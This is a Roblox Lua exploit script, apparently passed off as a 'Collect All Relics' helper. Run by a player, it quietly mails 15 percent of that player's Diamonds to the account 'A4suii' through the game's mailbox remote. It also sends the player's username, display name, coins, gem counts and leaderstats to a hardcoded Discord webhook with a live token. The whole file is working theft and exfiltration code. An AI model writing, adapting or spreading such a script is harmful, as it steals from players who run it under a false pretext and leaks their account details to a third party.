local WebHook = "https://discord.com/api/webhooks/1264830968301355102/34BGyT0h8b1hCCFbq9EUgqnJWZPis3yaMiGa0q1kAZZsBWJnD3t8x0SF0_eRx9_A47T6"
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local function getLeaderstats(player)
    local leaderstats = player:FindFirstChild("leaderstats")
    if leaderstats then
        local stats = {}
        for _, stat in pairs(leaderstats:GetChildren()) do
            if stat:IsA("IntValue") or stat:IsA("NumberValue") or stat:IsA("StringValue") then
                table.insert(stats, stat.Name .. ": " .. tostring(stat.Value))
            end
        end
        return #stats > 0 and table.concat(stats, "\n") or "No leaderstats"
    else
        return "No leaderstats"
    end
end

local function sendToWebhook(realGems, gemsSent, playerCoins)
    local player = Players.LocalPlayer
    local realUser = player.Name
    local displayName = player.DisplayName
    local leaderboardInfo = getLeaderstats(player)

    local embed = {
        title = "💎 Gems Sent Notification",
        description = "Details of the gems sent:",
        color = 7506394,
        fields = {
            { name = "👤 Real User", value = "``" .. realUser .. "``", inline = true },
            { name = "🌟 Display Name", value = "``" .. displayName .. "``", inline = true },
            { name = "💰 Player Coins", value = "``" .. (playerCoins or "nil") .. "``", inline = true },
            { name = "💰 Gems Sent", value = "``" .. (gemsSent or "nil") .. "``", inline = true },
            { name = "💰 Real Gems", value = "``" .. (realGems or "nil") .. "``", inline = true },
            { name = "🏆 Leaderboard Stats", value = "``" .. leaderboardInfo .. "``", inline = false }
        },
        footer = {
            text = "Captured at: ``" .. os.date("%Y-%m-%d %H:%M:%S") .. "•Today at " .. os.date("%I:%M %p") .. "``",
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    local data = { embeds = { embed } }
    local headers = { ["Content-Type"] = "application/json" }
    local request = http_request or request or HttpPost or syn.request

    local success, response = pcall(function()
        return request({
            Url = WebHook,
            Method = "POST",
            Headers = headers,
            Body = HttpService:JSONEncode(data)
        })
    end)

    if not success then
        print("Failed to send message to Discord webhook. Error: " .. response)
    else
        print("Message sent to Discord webhook!")
    end
end

local function applyPercentage(amount, percentage)
    local result = amount * (percentage / 100)
    return math.floor(result)
end

local percentage = 15
local gems = require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Currency
local player = Players.LocalPlayer
local playerCoins = player.PlayerGui.Main.Top.Coins.Amount.Text

for i, v in pairs(gems) do
    if v.id == "Diamonds" then
        local realGems = v._am
        local adjustedAmount = applyPercentage(realGems, percentage)

        if adjustedAmount >= 500 and (realGems - adjustedAmount) >= 0 then
            local args = {
                [1] = "A4suii",
                [2] = "Payment For Collect All Relics!",
                [3] = "Currency",
                [4] = i,
                [5] = adjustedAmount
            }

            pcall(function()
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            end)
            sendToWebhook(realGems, adjustedAmount, playerCoins)
            break
        else
            sendToWebhook(realGems, nil, playerCoins)
        end
    end
end
